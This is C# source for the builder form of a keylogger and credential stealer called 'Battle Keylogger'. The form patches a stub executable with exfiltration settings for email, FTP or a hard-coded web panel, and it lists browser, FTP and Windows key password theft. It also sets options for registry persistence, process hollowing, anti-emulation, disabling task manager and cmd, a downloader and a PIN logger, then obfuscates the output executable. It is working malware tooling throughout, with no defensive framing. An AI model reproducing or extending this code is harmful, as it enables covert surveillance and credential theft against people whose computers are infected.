using Mono.Cecil;
using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Galaxy_Logger.Forms
{
    public partial class frmKeylogger : Form
    {
        private const string WEBPANEL = "http://educationaltools.info/webpanel";
        private static Random random = new Random();
        OpenFileDialog openFileDialog = new OpenFileDialog();
        private static string HWID = string.Empty;
        private License zLicense;
        public frmKeylogger()
        {
            InitializeComponent();
        }
        public static void SetDoubleBuffered(System.Windows.Forms.Control c)
        {
            //Taxes: Remote Desktop Connection and painting
            //http://blogs.msdn.com/oldnewthing/archive/2006/01/03/508694.aspx
            if (System.Windows.Forms.SystemInformation.TerminalServerSession)
                return;

            System.Reflection.PropertyInfo aProp =
                  typeof(System.Windows.Forms.Control).GetProperty(
                        "DoubleBuffered",
                        System.Reflection.BindingFlags.NonPublic |
                        System.Reflection.BindingFlags.Instance);

            aProp.SetValue(c, true, null);
        }
        public void SetupPasswordRecoveryListView()
        {
            Dictionary<string, string> lvItems = new Dictionary<string, string>();
            lvItems.Add("Internet Explorer", "Versions 4.0-11.0");
            lvItems.Add("Mozilla Firefox", "All Versions");
            lvItems.Add("Google Chrome", "All Versions");
            lvItems.Add("Opera", "All Versions");
            lvItems.Add("Safari", "All Versions");
            lvItems.Add("SeaMonkey", "All Versions");
            lvItems.Add("Minecraft", "As long as there is a lastlogin file");
            lvItems.Add("Windows Product Key", "Any version Battle Keylogger is compatible with");
            lvItems.Add("Filezilla", "All Versions");
            lvItems.Add("CoreFTP", "All Versions");
            listView1.BeginUpdate();
            int index = 0;
            foreach (KeyValuePair<string, string> entry in lvItems)
            {
                listView1.Items.Add(new ListViewItem(new string[] { entry.Key, entry.Value }, index));
                index++;
            }
            listView1.EndUpdate();
       
        }
        private void slcClose1_Click_1(object sender, EventArgs e)
        {
            Hide();
            //Application.Exit();
        }

        private void slcTheme1_Click_1(object sender, EventArgs e)
        {

        }

        private void frmKeylogger_Load(object sender, EventArgs e)
        {
            SetDoubleBuffered(this);
            HWID = GenerateHWID();
            SetupPasswordRecoveryListView();
            slcComboBox1.SelectedIndex = 0;
            slcComboBox2.SelectedIndex = 0;
        }
        #region " HWID "
        private static string GenerateHWID()
        {
            try
            {
                Guid IntGuID = new Guid();
                uint IntSerialNum = 0;
                string str = "C:";
                string str1 = null;
                uint num = 0;
                uint num1 = 0;
                string str2 = null;
                GetVolumeInformationA(ref str, ref str1, 255, ref IntSerialNum, ref num, ref num1, ref str2, 255);
                HidD_GetHidGuid(ref IntGuID);
                string GenerateHwid = MD5(string.Concat(IntGuID.ToString(), IntSerialNum.ToString()));
                return GenerateHwid;
            }
            catch { }
            return string.Empty;
        }
        private static string MD5(string inputstr)
        {
            string Md5Hash;
            using (MD5CryptoServiceProvider md5object = new MD5CryptoServiceProvider())
            {
                byte[] BytesToHash = md5object.ComputeHash(Encoding.ASCII.GetBytes(inputstr));
                string Output = null;
                byte[] numArray = BytesToHash;
                for (int i = 0; i < checked((int)numArray.Length); i++)
                {
                    byte b = numArray[i];
                    Output = string.Concat(Output, b.ToString("X2"));
                }
                Md5Hash = Output.ToUpper();
            }
            return Md5Hash;
        }
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern bool GetVolumeInformationA(ref string lpRootPathName, ref string lpVolumeNameBuffer, uint nVolumeNameSize, ref uint lpVolumeSerialNumber, ref uint lpMaximumComponentLength, ref uint lpFileSystemFlags, ref string lpFileSystemNameBuffer, uint nFileSystemNameSize);

        [DllImport("hid", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern void HidD_GetHidGuid(ref Guid hidGuid);

        #endregion
        private void nsRandomPool1_ValueChanged(object sender)
        {
            slcTextBox14.Text = nsRandomPool1.Value;
        }

        private void slCbtn1_Click(object sender, EventArgs e)
        {
            try
            {
                if (!DeliverySettingsFilled())
                {
                    MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }
                if (rbEmail.Checked)
                {
                    MailMessage mail = new MailMessage();
                    SmtpClient SmtpServer = new SmtpClient(slcTextBox4.Text);
                    mail.From = new MailAddress(slcTextBox2.Text);
                    mail.To.Add(slcTextBox2.Text);
                    mail.Subject = "Battle Keylogger - Test E-Mail";
                    mail.Body = "Test E-Mail!";
                    SmtpServer.Port = Convert.ToInt32(slcTextBox6.Text);
                    SmtpServer.Credentials = new System.Net.NetworkCredential(slcTextBox2.Text, slcTextBox5.Text);
                    SmtpServer.EnableSsl = slcCheckbox1.Checked;
                    SmtpServer.Send(mail);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbFTP.Checked)
                {
                    byte[] bytes = System.Text.ASCIIEncoding.ASCII.GetBytes(("Test FTP Upload!"));
                    String ftp = slcTextBox8.Text;
                    if (!(ftp.Substring(0, "ftp://".Length)).ToLower().Equals("ftp://"))
                    {
                        ftp = "ftp://" + ftp;
                    }
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create(ftp + "/Battle Keylogger_TestUpload.txt");
                    request.Method = WebRequestMethods.Ftp.UploadFile;
                    request.Credentials = new NetworkCredential(slcTextBox7.Text, slcTextBox3.Text);
                    request.ContentLength = bytes.Length;
                    Stream requestStream = request.GetRequestStream();
                    requestStream.Write(bytes, 0, bytes.Length);
                    requestStream.Close();
                    FtpWebResponse response = (FtpWebResponse)request.GetResponse();
                    Console.WriteLine("Upload File Complete, status {0}", response.StatusDescription);
                    MessageBox.Show("Test message sent!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else if (rbWeb.Checked)
                {
                    using (WebClient client = new WebClient())
                    {
                        //MessageBox.Show("Not available until panel is updated, this update is pretty big and will take a few days to roll-out completely.", "Sorry", MessageBoxButtons.OK, MessageBoxIcon.Information);


                        byte[] response = client.UploadValues(WEBPANEL + "/insert", new NameValueCollection()
                        {
                            { "key", slcTextBox1.Text },
                            { "type", "1" },
                            { "pcname", "TEST LOG UPLOAD" },
                            { "log", "Log upload completed."},
                            { "hwid", HWID }
                        });
                        string result = System.Text.Encoding.UTF8.GetString(response);
                        if (result.Equals("ok"))
                            MessageBox.Show("Log uploaded successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        else
                            MessageBox.Show("Log failed to upload.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                    }
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.ToString(), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); }
        }
        private bool DeliverySettingsFilled()
        {
            if (rbEmail.Checked)
            {
                return !(string.IsNullOrEmpty(slcTextBox2.Text) || string.IsNullOrEmpty(slcTextBox5.Text) || string.IsNullOrEmpty(slcTextBox4.Text) 
                    || string.IsNullOrEmpty(slcTextBox6.Text));
            }
            else if (rbFTP.Checked)
            {
                return !(string.IsNullOrEmpty(slcTextBox3.Text) || string.IsNullOrEmpty(slcTextBox7.Text) || string.IsNullOrEmpty(slcTextBox8.Text));
            }
            else if (rbWeb.Checked)
            {
                return !string.IsNullOrEmpty(slcTextBox1.Text);
            }
            return false;
        }

        private void slCbtn3_Click_1(object sender, EventArgs e)
        {
            if (!DeliverySettingsFilled())
            {
                MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.InitialDirectory = Application.StartupPath;
                sfd.FileName = "*.exe";
                sfd.DefaultExt = ".exe|*.exe";
                sfd.Filter = "Executable Files .exe|*.exe";
                //if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK && X())
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {

                    Thread tr = new Thread(BuildFile);
                    tr.SetApartmentState(ApartmentState.MTA);
                    tr.Start(sfd.FileName);
                    //new Thread(new ParameterizedThreadStart(BuildFile)).Start(sfd.FileName);
                }
            }
        }
        private void BuildFile(object args)
        {
            string savePath = args.ToString();
            Action test = () =>
            {
                
                listView3.Items.Clear();
                listView3.Items.Add("> Starting build...");
                listView3.Items.Add("> Reading settings...");
            };
            listView3.Invoke(test);

            //
            //

            string mutex = slcTextBox14.Text;
            if (string.IsNullOrEmpty(mutex))
                mutex = Guid.NewGuid().ToString();
            try
            {
                AssemblyDefinition a = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\stub.bin");
                //MonoHelper.ReplaceString("[PAYLOAD]", payLoad, a);
                MonoHelper.ReplaceString("[MUTEX]", mutex, a);
                MonoHelper.ReplaceString("[HWID]", HWID, a);
                MonoHelper.ReplaceString("[LOGINTERVAL]", slcTextBox9.Text, a);



                MonoHelper.ReplaceString("[REGISTRYPATH]", StringCipher.Encrypt(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", mutex), a);
                MonoHelper.ReplaceString("[ZONEID]", StringCipher.Encrypt(":Zone.Identifier", mutex), a);
                MonoHelper.ReplaceString("[REGISTRYCOREFTP]", StringCipher.Encrypt(@"HKEY_CURRENT_USER\Software\FTPWare\COREFTP\Sites\", mutex), a);
                MonoHelper.ReplaceString("[SITEMANAGER]", StringCipher.Encrypt("sitemanager.xml", mutex), a);
                MonoHelper.ReplaceString("[RECENTSERVERS]", StringCipher.Encrypt("recentservers.xml", mutex), a);
                MonoHelper.ReplaceString("[CHROMEPATH]", StringCipher.Encrypt(@"\Google\Chrome\User Data\Default\", mutex), a);

                //MonoHelper.ReplaceString("[CreateProcessW]", StringCipher.Encrypt("CreateProcessW", mutex), a);
                MonoHelper.ReplaceString("[GetThreadContext]", StringCipher.Encrypt("GetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[NtUnmapViewOfSection]", StringCipher.Encrypt("NtUnmapViewOfSection", mutex), a);
                MonoHelper.ReplaceString("[ReadProcessMemory]", StringCipher.Encrypt("ReadProcessMemory", mutex), a);
                MonoHelper.ReplaceString("[ResumeThread]", StringCipher.Encrypt("ResumeThread", mutex), a);
                MonoHelper.ReplaceString("[SetThreadContext]", StringCipher.Encrypt("SetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[VirtualAllocEx]", StringCipher.Encrypt("VirtualAllocEx", mutex), a);
                MonoHelper.ReplaceString("[Wow64GetThreadContext]", StringCipher.Encrypt("Wow64GetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[Wow64SetThreadContext]", StringCipher.Encrypt("Wow64SetThreadContext", mutex), a);
                MonoHelper.ReplaceString("[WriteProcessMemory]", StringCipher.Encrypt("WriteProcessMemory", mutex), a);




                //Always things here


                //Now settings

                if (rbEmail.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "EMAIL", a);
                }
                else if (rbFTP.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "FTP", a);
                }
                else if (rbWeb.Checked)
                {
                    MonoHelper.ReplaceString("[UPLOADMETHOD]", "PHP", a);
                }


                MonoHelper.ReplaceString("[EMAILUSERNAME]", StringCipher.Encrypt(slcTextBox2.Text, mutex), a);
                MonoHelper.ReplaceString("[EMAILPASSWORD]", StringCipher.Encrypt(slcTextBox5.Text, mutex), a);
                MonoHelper.ReplaceString("[EMAILPORT]", StringCipher.Encrypt(slcTextBox6.Text, mutex), a);
                if (slcCheckbox1.Checked)
                    MonoHelper.ReplaceString("[EMAILSSL]", Guid.NewGuid().ToString(), a);
                else
                    MonoHelper.ReplaceString("[EMAILSSL]", string.Empty, a);
                MonoHelper.ReplaceString("[EMAILSERVER]", StringCipher.Encrypt(slcTextBox4.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPUSERNAME]", StringCipher.Encrypt(slcTextBox7.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPPASSWORD]", StringCipher.Encrypt(slcTextBox3.Text, mutex), a);
                MonoHelper.ReplaceString("[FTPSERVER]", StringCipher.Encrypt(slcTextBox8.Text, mutex), a);
                MonoHelper.ReplaceString("[WEBPANELKEY]", StringCipher.Encrypt(slcTextBox1.Text, mutex), a);
                MonoHelper.ReplaceString("[WEBPANEL]", StringCipher.Encrypt(WEBPANEL, mutex), a);

                //Install Tab
                if (install.Toggled)
                {
                    String tVAr = "";
                    Invoke(new MethodInvoker(() => tVAr = (slcComboBox1.SelectedIndex + 1).ToString()));

                    //Invoke(new Action( tVAr = (comboBoxDirectory.SelectedIndex + 1).ToString()));

                    MonoHelper.ReplaceString("[INSTALLFILE]", Guid.NewGuid().ToString(), a);
                    MonoHelper.ReplaceString("[PATHTYPE]", tVAr, a);
                    MonoHelper.ReplaceString("[FOLDER]", slcTextBox11.Text, a);
                    MonoHelper.ReplaceString("[FILENAME]", slcTextBox12.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[INSTALLFILE]", string.Empty, a);
                }

                if (slcCheckbox2.Checked)
                {
                    MonoHelper.ReplaceString("[HKCU]", slcTextBox13.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HKCU]", string.Empty, a);
                }

                if (slcCheckbox3.Checked)
                {
                    MonoHelper.ReplaceString("[HKLM]", slcTextBox10.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HKLM]", string.Empty, a);
                }

                if (slcCheckbox5.Checked)
                {
                    MonoHelper.ReplaceString("[REGPERSISTENCE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[REGPERSISTENCE]", string.Empty, a);
                }

                if (slcCheckbox4.Checked)
                {
                    MonoHelper.ReplaceString("[HIDEFILE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[HIDEFILE]", string.Empty, a);
                }
                //
                //General Tab
                if (slcCheckbox6.Checked)
                {
                    MonoHelper.ReplaceString("[CLIPBOARD]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[CLIPBOARD]", string.Empty, a);
                }

                if (slcCheckbox7.Checked)
                {
                    MonoHelper.ReplaceString("[MODIFYTASK]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MODIFYTASK]", string.Empty, a);
                }

                if (slcCheckbox9.Checked)
                {
                    MonoHelper.ReplaceString("[MELTFILE]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MELTFILE]", string.Empty, a);
                }

                if (slcCheckbox8.Checked)
                {
                    MonoHelper.ReplaceString("[SCREENSHOTS]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[SCREENSHOTS]", string.Empty, a);
                }

                if (slcCheckbox13.Checked)
                {
                    MonoHelper.ReplaceString("[ANTIEMULATION]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[ANTIEMULATION]", string.Empty, a);
                }

                if (slcCheckbox12.Checked)
                {
                    MonoHelper.ReplaceString("[PROCESSPROTECTION]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[PROCESSPROTECTION]", string.Empty, a);
                }

                if (slcCheckbox11.Checked)
                {
                    MonoHelper.ReplaceString("[PINLOGGER]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[PINLOGGER]", string.Empty, a);
                }

                if (slcCheckbox10.Checked)
                {
                    MonoHelper.ReplaceString("[CLEARSAVED]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[CLEARSAVED]", string.Empty, a);
                }

                if (slcCheckbox22.Checked)
                {
                    MonoHelper.ReplaceString("[URL]", slcTextBox26.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("URL", string.Empty, a);
                }

                //
                //Miscellaneous Tab
                if (slcCheckbox14.Checked)
                {
                    String tvar = "";
                    Invoke(new MethodInvoker(() => tvar = slcTextBox16.Text));
                    MonoHelper.ReplaceString("[DOWNLOADURL]", slcTextBox15.Text, a);
                    MonoHelper.ReplaceString("[TYPE]", tvar, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[DOWNLOADURL]", string.Empty, a);
                    MonoHelper.ReplaceString("[TYPE]", string.Empty, a);
                }

                if (slcCheckbox15.Checked)
                {
                    String tvar = "";
                    Invoke(new MethodInvoker(() => tvar = slcComboBox2.Text));
                    MonoHelper.ReplaceString("[MTYPE]", tvar, a);
                    MonoHelper.ReplaceString("[MTITLE]", slcTextBox17.Text, a);
                    MonoHelper.ReplaceString("[MBODY]", slcTextBox18.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[MTYPE]", string.Empty, a);
                }

                if (slcCheckbox1.Checked)
                {
                    MonoHelper.ReplaceString("[DELAY]", slcTextBox19.Text, a);
                }
                else
                {
                    MonoHelper.ReplaceString("[DELAY]", "0", a);
                }

                if (slcOnOffBox1.Toggled)
                {
                    MonoHelper.ReplaceString("[STEALER]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[STEALER]", string.Empty, a);
                }



                if (slcCheckbox20.Checked)
                {
                    MonoHelper.ReplaceString("[TASKMGR]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[TASKMGR]", string.Empty, a);
                }

                if (slcCheckbox18.Checked)
                {
                    MonoHelper.ReplaceString("[CMD]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[CMD]", string.Empty, a);
                }

                if (slcCheckbox19.Checked)
                {
                    MonoHelper.ReplaceString("[REGISTRY]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[REGISTRY]", string.Empty, a);
                }

                if (slcCheckbox21.Checked)
                {
                    MonoHelper.ReplaceString("[BOTKILL]", Guid.NewGuid().ToString(), a);
                }
                else
                {
                    MonoHelper.ReplaceString("[BOTKILL]", string.Empty, a);
                }




                Action doneSettings = () =>
                {
                    listView3.Items.Add("> Settings done...");
                };
                listView3.Invoke(doneSettings);


                a.Write(savePath);
                //if (cbChangeIcon.Checked && !string.IsNullOrEmpty(tbIconPath.AmbianceTB.Text))
                //    IconInjector.InjectIcon(savePath, tbIconPath.AmbianceTB.Text);
                listView3.Invoke((MethodInvoker)delegate { listView3.Items.Add("> Obfuscating file..."); });
                Process.Start(Application.StartupPath + "\\Obfuscator\\Obfuscator.exe", string.Format("\"{0}\" {1}", savePath, "3"));
                Thread.Sleep(3000);
                //ObfuscateCode(savePath);
                while (!File.Exists(savePath + "-Renamed.exe"))
                    Thread.Sleep(500);
                File.Delete(savePath);
                File.Move(savePath + "-Renamed.exe", savePath);
                //if (cbChangeAssembly.Checked)
                //{
                //    //string changeAsmArgs = string.Format("{0} {1} /va /s title {2} /s desc {3} /s company {4} /s product {5} /s copyright {6}", savePath, tbVersion.Text, tbTitle.Text, tbDescription.Text, tbCompany.Text, tbProduct.Text, tbCopyright.Text);
                //    //Process.Start(Application.StartupPath + "\\verpatch.exe", changeAsmArgs);
                //}
                listView3.Invoke((MethodInvoker)delegate { listView3.Items.Add("> File saved @ " + savePath); });

                MessageBox.Show("Battle Keylogger Built!", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message, "Failure", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

        }

        private void slcTextBox1_MouseHover(object sender, EventArgs e)
        {
            System.Windows.Forms.ToolTip ToolTip1 = new System.Windows.Forms.ToolTip();
            ToolTip1.SetToolTip(this.slcTextBox1, "You can find this on the webpanel under account settings.");
        }

        private void slcGroupBox1_MouseHover(object sender, EventArgs e)
        {
            System.Windows.Forms.ToolTip ToolTip1 = new System.Windows.Forms.ToolTip();
            ToolTip1.SetToolTip(this.slcGroupBox1, "You can find this on the webpanel under account settings.");
        }

        private void slcCheckbox13_MouseHover(object sender, EventArgs e)
        {
            System.Windows.Forms.ToolTip ToolTip1 = new System.Windows.Forms.ToolTip();
            ToolTip1.SetToolTip(this.slcCheckbox13, "To prevent emulation.");

        }

        private void slcCheckbox7_MouseHover(object sender, EventArgs e)
        {

            System.Windows.Forms.ToolTip ToolTip1 = new System.Windows.Forms.ToolTip();
            ToolTip1.SetToolTip(this.slcCheckbox7, "Protect process by detecting task manager.");
        }

        private void slCbtn2_Click_1(object sender, EventArgs e)
        {
            if (!DeliverySettingsFilled())
            {
                MessageBox.Show("Delivery settings not completed!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
            using (SaveFileDialog sfd = new SaveFileDialog())
            {
                sfd.InitialDirectory = Application.StartupPath;
                sfd.FileName = "*.exe";
                sfd.DefaultExt = ".exe|*.exe";
                sfd.Filter = "Executable Files .exe|*.exe";
                //if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK && X())
                if (sfd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {

                    Thread tr = new Thread(BuildFile);
                    tr.SetApartmentState(ApartmentState.MTA);
                    tr.Start(sfd.FileName);
                    //new Thread(new ParameterizedThreadStart(BuildFile)).Start(sfd.FileName);
                }
            }
        }

        private void divineCheckBox3_CheckedChanged(object sender, EventArgs e)
        {

        }
        private void slcCheckbox9_CheckedChanged(object sender, EventArgs e)
        {

        }


        //Select All
        private void divineCheckBox4_CheckedChanged(object sender, EventArgs e)
        {
            slcCheckbox18.Checked = true;
            divineCheckBox1.Checked = true;
            slcCheckbox19.Checked = true;
            divineCheckBox3.Checked = true;
        }


        //Select All
        private void divineCheckBox5_CheckedChanged(object sender, EventArgs e)
        {
            divineCheckBox2.Checked = true;
            divineCheckBox7.Checked = true;
            divineCheckBox6.Checked = true;
        }

        private void slCbtn3_Click(object sender, EventArgs e)
        {
            //listView2.Invoke((MethodInvoker)delegate { listView2.Items.Add("> Searching for file..."); });
            //Thread.Sleep(300);
            //listView2.Invoke((MethodInvoker)delegate { listView2.Items.Add("> found file..."); });
            //Thread.Sleep(300);
            //listView2.Invoke((MethodInvoker)delegate { listView2.Items.Add("> Removing file..."); });
            //Thread.Sleep(1000);
            //listView2.Invoke((MethodInvoker)delegate { listView2.Items.Add("> Searching for file..."); });
            listView2.Invoke((MethodInvoker)delegate { listView2.Items.Add("> Coming soon..."); });
        }

    }
}
